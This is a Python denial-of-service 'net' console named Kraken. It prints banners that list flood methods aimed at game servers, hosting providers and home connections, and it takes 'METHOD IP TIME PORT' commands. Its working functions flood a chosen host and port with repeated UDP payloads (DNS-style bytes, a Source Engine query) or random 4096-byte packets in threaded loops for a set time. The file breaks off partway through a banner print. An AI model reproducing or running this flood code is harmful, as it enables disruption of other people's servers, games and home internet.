#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "Waffle"
method = "{sinput}"
host = "{host}"
port = "{port}"
timer = "{timer}"

attack = """
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m 
""".format(method,host,port,timer)

adminHelp = """
    \x1b[33m╔═══════════════════════╗\x1b[33m    \x1b[33m╔═══════════════════════╗\x1b[33m
    \x1b[33m║      \x1b[36mTotal Users\x1b[33     ║\x1b[33m      \x1b[33m║      \x1b[36mTotal Users\x1b[33m      ║\x1b[33m
    \x1b[33m╠═══════════════════════╣\x1b[33m    \x1b[33m╠═══════════════════════╣\x1b[33m
    \x1b[33m║           \x1b[36m[1]\x1b[33m       ║\x1b[33m      \x1b[33m║           \x1b[36m[1]\x1b[33m\x1b[33m         ║ 
    \x1b[33m╚═══════════════════════╝\x1b[33m    \x1b[33m╚═══════════════════════╝\x1b[33m
"""

rules = """
            \x1b[37m--+- -\x1b[33m-  +-++-+
            \x1b[37m¦-+¦ ¦\x1b[33m¦  ¦¦ +-+
            \x1b[37m-+-+-+\x1b[33m--++-++-+
  \x1b[37m+---------------\x1b[33m------------------+
  \x1b[37m¦ 1. DO NOT SHAR\x1b[33mE NET LOGINS!!    ¦
  \x1b[37m¦ 2. NO SHARING \x1b[33mNET IP/DOMAIN!!   ¦
  \x1b[37m¦ 3. PLEASE NO S\x1b[33mPAM ATTACKS!!     ¦
  \x1b[37m¦ 4. RESPECT ALL\x1b[33m CRONICAL OWNERS!!¦
  \x1b[37m¦ 5. NO HITTING \x1b[33mDSTATS/GOVS!!     ¦
  \x1b[37m+---------------\x1b[33m------------------+
"""

methods = """
\033[34m╔════════════════════════╗
\033[34m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[34m╚═════════╗
\033[34m║ \033[32mgen3   \033[36m> \033[32mShows Gen3 Methods!     \033[34m║
\033[34m║ \033[32mgen2   \033[36m> \033[32mShows Gen2 Methods!     \033[34m║
\033[34m║ \033[32mlayer4 \033[36m> \033[32mShows Layer 4 Methods!  \033[34m║
\033[34m║ \033[32mlayer7 \033[36m> \033[32mShows Layer 7 Methods!  \033[34m║
\033[34m║ \033[32mvip \033[36m   > \033[32mShows Vip Methods!  \033[34m    ║
\033[34m║ \033[32mprivate\033[36m> \033[32mShows Private Methods!  \033[34m║
\033[34m║ \033[32mraw    \033[36m> \033[32mShows Raw Methods!      \033[34m║
\033[34m║ \033[32mhome    \033[36m> \033[32mShows Home Methods!      \033[34m║
\033[34m╚══════════════════════════════════╝
"""

cronical = """
                        \x1b[37m╔═╗╦═╗╔═╗╔╗╔\x1b[33m╦╔═╗╔═╗╦    ╔═╗╔═╗╦
                        \x1b[37m║  ╠╦╝║ ║║║║\x1b[33m║║  ╠═╣║    ╠═╣╠═╝║
                        \x1b[37m╚═╝╩╚═╚═╝╝╚╝\x1b[33m╩╚═╝╩ ╩╩═╝  ╩ ╩╩  ╩
                   \x1b[37m═════════════╦═══\x1b[33m══════════╦════════════
          \x1b[37m╔═════════════╦═══════╩═══\x1b[33m═══╦══════╩═══════╦═════════════╗
          \x1b[37m║ OVH-CL     ╔╩╗ NFOBETA-C\x1b[33mL ╔╩╗ GAME-CL    ╔╩╗ ....       ║
          \x1b[37m║ SYN-CL     ║ ║ WRA-CL   \x1b[33m  ║ ║ UBIQUITI-CL║ ║ ....       ║
          \x1b[37m║ TCP-CL     ╚╦╝ MIXAMP-CL\x1b[33m  ╚╦╝ HOME-CL    ╚╦╝ .....      ║
          \x1b[37m╚═════════════╩═══════════\x1b[33m═══╩══════════════╩═════════════╝
"""

demonic = """
                           \x1b[37m╔╦╗ ╔═╗ ╔╦╗ \x1b[33m╔═╗ ╔╗╔ ╦ ╔═╗  
                            \x1b[37m║║ ║╣  ║║║ \x1b[33m║ ║ ║║║ ║ ║    
                           \x1b[37m═╩╝ ╚═╝ ╩ ╩ \x1b[33m╚═╝ ╝╚╝ ╩ ╚═╝
                     \x1b[37m═════════════╦═════\x1b[33m════════╦════════════
    \x1b[37m╔═══════════════╗ ╔═══════════╩═══╗ \x1b[33m ╔══════╩════════╗ ╔═══════════════╗
    \x1b[37m║ SSDP          ╠═╣ ARD           ╠═\x1b[33m═╣ NTP           ╠═╣ UDP-MINI      ║
    \x1b[37m║ SNMP          ╠═╣ CLDAP         ╠═\x1b[33m═╣ HOME-CLAP     ╠═╣ STD           ║
    \x1b[37m╚═══════════════╝ ╚════╦════╦═════╝ \x1b[33m ╚═════╦════╦════╝ ╚═══════════════╝
            \x1b[37m╔══════════════╩╗  ╔╩═══════\x1b[33m═══════╩╗  ╔╩══════════════╗
            \x1b[37m║ TCP-SBNAFU    ╠══╣ PORT-KI\x1b[33mLL      ╠══╣ ROBLOX        ║
           \x1b[37m╔╣ PRODIGY-WRA   ╠══╣ FORTNIT\x1b[33mE       ╠══╣ FIVEM         ╠╗
          \x1b[37m╔╝╚═══════════════╝  ╚════════\x1b[33m════════╝  ╚═══════════════╝╚╗
          \x1b[37m╚════════════════════╦════════\x1b[33m════════╦════════════════════╝
   \x1b[37m═════════╦═════════════════╦╩════════\x1b[33m════════╩╦═════════════════╦═════════
    \x1b[37m╔═══════╩═══════╗ ╔═══════╩═══════╗ \x1b[33m ╔═══════╩═══════╗ ╔═══════╩═══════╗
    \x1b[37m║ NFO-ULTIMATE  ╠═╣ 100UP         ╠═\x1b[33m═╣ OVH-STRONG    ╠═╣ HTTP-BYPASS   ║
    \x1b[37m║ OVH-TCP       ║ ║ OVH-V2        ║ \x1b[33m ║ OVH-AMP       ║ ║ HTTP-GET      ║
    \x1b[37m║ HYDRA         ╠═╣ OVH-DOWN      ╠═\x1b[33m═╣ SYNDEMONIC    ╠═╣ HTTP-RAND     ║
    \x1b[37m╚═══════════════╝ ╚═══════════════╝ \x1b[33m ╚═══════════════╝ ╚═══════════════╝
"""

help = """
                               \x1b[37m_,    _ \x1b[33m  _    ,_
                          \x1b[37m.o888P     Y8\x1b[33mo8Y     Y888o.
                         \x1b[37md88888      88\x1b[33m888      88888b
                        \x1b[37md888888b_  _d88\x1b[33m888b_  _d888888b
                        \x1b[37m888888888888888\x1b[33m8888888888888888
                        \x1b[37m888888888888888\x1b[33m8888888888888888
                        \x1b[37mYJGS8P"Y888P"Y8\x1b[33m88P"Y888P"Y8888P
                         \x1b[37mY888   '8'   Y\x1b[33m8P   '8'   888Y
                          \x1b[37m'8o          \x1b[33mV          o8'
                            \x1b[37m`          \x1b[33m           `
                       \x1b[37m╚═══╦═══════════\x1b[33m════════════╦═══╝
                      \x1b[37m╔════╩═══════════\x1b[33m════════════╩══════╗
                      \x1b[37m║  METHODS -> [Sh\x1b[33mow Methods Pages]  ║
                      \x1b[37m║  TOOLS   -> [Sh\x1b[33mow All Net Tools]  ║
                      \x1b[37m║  STATUS  -> [Sh\x1b[33mow Net Status <3]  ║
                      \x1b[37m║  ACCOUNT -> [Sh\x1b[33mow Net Acc info ]  ║
                      \x1b[37m║  RULES   -> [Sh\x1b[33mow All Net Rules]  ║
                      \x1b[37m╚════════════════\x1b[33m═══════════════════╝
"""


raw = """
\033[38;5;57m                                             \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m
\033[38;5;57m                                             \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
\033[38;5;57m                                             \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                                     ╔══════════════════════════════════╗ 
\033[34m                                     ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                                     ╚══════════════════════════════════╝

\033[34m                           ╔══════════════════════════╦════════════════════════════╗
\033[34m                           ║ \033[32mudpraw \033[36m- \033[32mRaw UDP Flood \033[34m  ║ \033[32mhexraw \033[36m- \033[32mRaw HEX Flood \033[34m    ║
\033[34m                           ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[34m                            ║ \033[32mtcpraw \033[36m- \033[32mRaw TCP Flood \033[34m║ ║ \033[32mvseraw \033[36m- \033[32mRaw VSE Flood \033[34m  ║
\033[34m                            ║ \033[32mstdraw \033[36m- \033[32mRaw STD Flood \033[34m║ ║ \033[32msynraw \033[36m- \033[32mRaw SYN Flood \033[34m  ║
\033[34m                           ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[34m                           ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[34m║
\033[34m                           ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[38;5;57m                                \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m
\033[38;5;57m                                \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
\033[38;5;57m                                \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                       ╔══════════════════════════════════╗ 
\033[34m                       ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                       ╚══════════════════════════════════╝

\033[34m            ╔══════════════════════════╦════════════════════════════╗
\033[34m            ║ \033[32movhslav \033[36m- \033[32mSlavic Flood \033[34m  ║ \033[32mKrakenv1 \033[36m- \033[32mCustom Method! \033[34m ║
\033[34m            ║ \033[32mcpukill \033[36m- \033[32mCpu Rape Flood\033[34m ║ \033[32mKrakenv1v2 \033[36m- \033[32mCustom Method!\033[34m║
\033[34m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[34m             ║ \033[32mfivemkill \033[36m- \033[32mFivem Kill \033[34m║ ║ \033[32mKrakenv3 \033[36m-\033[32m Custom Method!\033[34m║
\033[34m             ║ \033[32micmprape  \033[36m- \033[32mICMP Rape  \033[34m║ ║ \033[32mssdp  \033[36m-\033[32m Amped SSDP      \033[34m ║
\033[34m             ║ \033[32mtcprape \033[36m- \033[32mRaping TCP   \033[34m║ ║ \033[32marknull \033[36m- \033[32mArk Method    \033[34m ║
\033[34m             ║ \033[32mnforape \033[36m- \033[32mNfo Method   \033[34m║ ║ \033[32m2kdown  \033[36m- \033[32mNBA 2K Flood  \033[34m ║
\033[34m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[34m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[34m║
\033[34m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[38;5;57m                               \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m
\033[38;5;57m                               \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
\033[38;5;57m                               \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                                ╔══════════════════════════════════╗ 
\033[34m                                ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                                ╚══════════════════════════════════╝

\033[34m                     ╔══════════════════════════╦════════════════════════════╗
\033[34m                     ║ \033[32mhomeslap    \033[36m. \033[32mr6kill     \033[34m║ \033[32mfivemtcp  \033[36m. \033[32mnfokill       \033[34m ║
\033[34m                     ║ \033[32mark255      \033[36m. \033[32marklift    \033[34m║ \033[32mhotspot   \033[36m. \033[32mvpn           \033[34m ║
\033[34m                     ║ \033[32mhydrakiller \033[36m. \033[32markdown    \033[34m║ \033[32mnfonull   \033[36m. \033[32mdhcp          \033[34m ║
\033[34m                     ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[34m                      ║ \033[32movhnat    \033[36m. \033[32movhamp     \033[34m║ ║ \033[32movhwdz    \033[36m. \033[32movhx         \033[34m║
\033[34m                      ║ \033[32mnfodrop   \033[36m. \033[32mnfocrush   \033[34m║ ║ \033[32mnfodown   \033[36m. \033[32mnfox         \033[34m║
\033[34m                      ║ \033[32mudprape   \033[36m. \033[32mudprapev3  \033[34m║ ║ \033[32mfortnite  \033[36m. \033[32mfortnitev2   \033[34m║
\033[34m                      ║ \033[32mudprapev2 \033[36m. \033[32mudpbypass  \033[34m║ ║ \033[32mgreeth    \033[36m. \033[32mtelnet       \033[34m║
\033[34m                      ║ \033[32mfivemv2   \033[36m. \033[32mr6drop     \033[34m║ ║\033[32m r6freeze  \033[36m. \033[32mkillall      \033[34m║
\033[34m                      ║ \033[32m2krape    \033[36m. \033[32mfallguys   \033[34m║ ║ \033[32movhdown   \033[36m. \033[32movhkill      \033[34m║
\033[34m                      ║ \033[32mfivemrape \033[36m. \033[32mfivemdown  \033[34m║ ║ \033[32mfivemv1   \033[36m. \033[32mfivemslump   \033[34m║
\033[34m                      ║ \033[32mkillallv2 \033[36m. \033[32mkillallv3  \033[34m║ ║ \033[32mpowerslap \033[36m. \033[32mrapecom      \033[34m║
\033[34m                     ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[34m                     ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[34m║
\033[34m                     ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\033[34m
\033[38;5;57m                                    \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m
\033[38;5;57m                                    \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
\033[38;5;57m                                    \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                           ╔══════════════════════════════════╗ 
\033[34m                           ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                           ╚══════════════════════════════════╝

\033[34m                 ╔══════════════════════════╦════════════════════════════╗
\033[34m                 ║  \033[32mudp \033[36m[IP] [TIME] [PORT]  \033[34m║   \033[32mvse \033[36m[IP] [TIME] [PORT]   \033[34m║
\033[34m                 ║  \033[32mtcp \033[36m[IP] [TIME] [PORT]  \033[34m║   \033[32mack \033[36m[IP] [TIME] [PORT]   \033[34m║
\033[34m                 ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[34m                  ║ \033[32mstd \033[36m[IP] [TIME] [PORT] \033[34m║ ║ \033[32mdns \033[36m[IP] [TIME] [PORT]   \033[34m║
\033[34m                  ║ \033[32msyn \033[36m[IP] [TIME] [PORT] \033[34m║ ║ \033[32movh \033[36m[IP] [TIME] [PORT]   \033[34m║
\033[34m                  ║\033[36m- - - - - - - \033[93mhomerape \033[32m[IP] [TIME] [PORT] \033[36m- - - - - -\033[34m║
\033[34m                 ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[34m                 ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[34m║
\033[34m                 ╚═══════════════════════════════════════════════════════╝
"""

gen2 = """
                                       \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m        
                                       \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
                                       \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                           ╔══════════════════════════════════╗ 
\033[34m                           ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                           ╚══════════════════════════════════╝

\033[34m                          ╔═══════════════════════════════════╗
\033[34m                          ║\033[32mMinecraftV1  \033[34mMinecraftV2           ║
\033[34m                          ║\033[32mCodV1    .   \033[34mCodV2                 ║
\033[34m                          ║\033[32mApexV1   .   \033[34mApexv2                ║
\033[34m                          ║\033[32mHaloV1   .   \033[34mHaloV2                ║
\033[34m                          ║\033[32mDoomV1   .   \033[34mDoomV2                ║
\033[34m                          ║\033[32mDestinyV1.   \033[34mDestinyV2             ║
\033[34m                          ║\033[32mForzaV1  .   \033[34mForzaV2               ║
\033[34m                          ║\033[32mHitallV1 .   \033[34mHitallV2              ║
\033[34m                          ╚═══════════════════════════════════╝                                   
\033[34m                                                                  
\033[34m                                                                  
"""

banner =  """
                          \x1b[37m╦╔═ ╦═╗ ╔═╗ \x1b[33m╦╔═ ╔═╗ ╔╗╔\x1b[33m  
                          \x1b[37m╠╩╗ ╠╦╝ ╠═╣ \x1b[33m╠╩╗ ║╣  ║║║\x1b[33m
                          \x1b[37m╩ ╩ ╩╚═ ╩ ╩ \x1b[33m╩ ╩ ╚═╝ ╝╚╝\x1b[33m 
                    \x1b[37m╚═══╦═════════════\x1b[33m════════════════╦═══╝\x1b[33m
                 \x1b[37m╔══════╩═════════════\x1b[33m════════════════╩══════╗\x1b[33m
                 \x1b[37m║    Welcome To Krake\x1b[33mn, Batman Edition      ║\x1b[33m
                 \x1b[37m║     Type Help To Se\x1b[33me Kraken's Cmd's       ║\x1b[33m
                 \x1b[37m╚════════════════════════\x1b[33m═══════════════════╝\x1b[33m

"""



vip = """
\033[38;5;54m
\033[38;5;54m            ╔══════════════════════════════╗
\033[38;5;54m            ║            vip-l4            ║
\033[38;5;54m            ╠══════════════════════════════╣
\033[38;5;54m            ║ vip-tcp    /   vip-random    ║
\033[38;5;54m            ║ vip-udp    /   ovh-vip       ║
\033[38;5;54m            ║ vip-syn    /   vip-ack       ║
\033[38;5;54m            ║ vip-std    /   vip-dns       ║                             
\033[38;5;54m            ╠══════════════════════════════╣
\033[34m            ║           vip-game           ║
\033[34m            ╠══════════════════════════════╣
\033[34m            ║ vip-forza    / vip-COD       ║
\033[34m            ║ vip-apex     / vip-gta       ║
\033[34m            ║ vip-fortnite / vip-minecraft ║
\033[34m            ╠══════════════════════════════╣
\033[34m            ║            vip-l7            ║
\033[31m            ╠══════════════════════════════╣
\033[31m            ║ vip-soc      / vip-get       ║
\033[31m            ║ vip-post     / vip-head      ║
\033[31m            ║ vip-cfbypass / vip-random    ║
\033[31m            ╚══════════════════════════════╝
\033[36m               \033[31mHow to use:[METHOD], [IP], [time], [port]
"""
 
star = """
\033[38;5;57m                                       \x1b[37m╦╔═ ╦═╗ ╔═╗ ╦╔═ \x1b[33m  ╔═╗ ╔╗╔\x1b[33m
\033[38;5;57m                                       \x1b[37m╠╩╗ ╠╦╝ ╠═╣ ╠╩╗ \x1b[33m  ║╣  ║║║\x1b[33m
\033[38;5;57m                                       \x1b[37m╩ ╩ ╩╚═ ╩ ╩ ╩ ╩ \x1b[33m  ╚═╝ ╝╚╝\x1b[33m
\033[34m                                ╔══════════════════════════════════╗ 
\033[34m                                ║\033[31m Kraken XV best \033[34mversion of kraken ║
\033[34m                                ╚══════════════════════════════════╝

\033[34m                          ╔═══════════════════════════════════╗
\033[34m                          ║\033[32mMinecraftV1  \033[34mMinecraftV2           ║
\033[34m                          ║\033[32mCodV1    .   \033[34mCodV2                 ║
\033[34m                          ║\033[32mApexV1   .   \033[34mApexv2                ║
\033[34m                          ║\033[32mHaloV1   .   \033[34mHaloV2                ║
\033[34m                          ║\033[32mDoomV1   .   \033[34mDoomV2                ║
\033[34m                          ║\033[32mDestinyV1.   \033[34mDestinyV2             ║
\033[34m                          ║\033[32mForzaV1  .   \033[34mForzaV2               ║
\033[34m                          ║\033[32mHitallV1 .   \033[34mHitallV2              ║
\033[34m                          ╚═══════════════════════════════════╝                                   
\033[34m                                                                
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(91,91))
		sys.stdout.write("\x1b]2;Kraken. | Devices: [{}] | Clients: [1]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Kraken]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "demonic":
			os.system ("cls")
			print (demonic)
			main()
		elif sinput == "cronical":
			os.system ("cls")
			print (cronical)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "gen2":
			os.system ("cls")
			print (gen2)
			main()
		elif sinput == "methods":
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("cls")
			print (private)
			main()
		elif sinput == "adminhelp":
			os.system ("cls")
			print (adminHelp)
			main()
		elif sinput == "gen3":
			os.system ("cls")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "rules":
			os.system ("cls")
			print (rules)
			main()
		elif sinput == "help":
			os.system ("cls")
			print (help)
			main()
		elif sinput == "dns":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VSE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VSE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [SYN]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
